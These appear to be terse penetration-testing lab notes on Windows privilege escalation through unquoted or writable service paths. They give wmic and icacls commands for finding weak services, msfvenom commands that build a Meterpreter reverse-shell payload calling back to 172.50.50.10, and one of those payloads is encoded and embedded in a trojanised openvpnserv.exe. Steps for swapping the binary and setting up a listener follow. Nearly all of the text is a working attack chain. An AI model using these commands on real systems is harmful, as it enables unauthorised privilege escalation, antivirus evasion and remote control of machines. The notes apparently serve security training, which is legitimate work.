
metasploit module
use exploit/windows/local/trusted_service_path

manual way>

1. run with higher privileges
2. automatically start at boot
• OR can be restarted (with lower privileges)
• OR are vulnerable to DoS (meaning that we can cause the service to crash and
let Windows to automatically restart it)
3. have their binaries in paths where we have write privileges. 

wmic service > serv_list.txt
download C:\\Users\\eLS\\serv_list.txt serv_list.txt

icacls C:\windows\system32   >>> we need F or M, RX is not enough

Find unquoted paths
wmic service WHERE "NOT PathName LIKE '%system32%'" GET PathName, Name
wmic service WHERE "NOT PathName LIKE '%system32%'" GET PathName, Name > C:\Users\els\filt_serv.txt
download C:\\Users\\els\\filt_serv.txt filt_serv.txt

 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
 
 manual way with
 sc qc servicename

Check for all found programs
icacls "C:\Program Files\OpenVPN\bin"
icacls "C:\Program Files\OpenVPN\bin\openvpnserv.exe"

we can replace the exe with a payloadexe (poor people style)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.10 LPORT=4450 --platform Windows -f exe > openvpnserv.exe

alternative we mix a good program with a bad one
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.10 LPORT=4450 -f exe -e x86/shikata_ga_nai -i 15 -k -x openvpnserv.exe.bck openvpnserv.exe

 cd "C:\\Program Files\\OpenVPN\\bin"
 mv openvpnserv.exe openvpnserv.exe.bck
 
 upload /root/openvpnserv.exe openvpnserv.exe
 
 multi/handler
 set LPORT 4450
 set PAYLOAD windows/meterpreter/reverse_tcp
 set AutoRunScript explorer.exe
 set AutoRunScript migrate -f
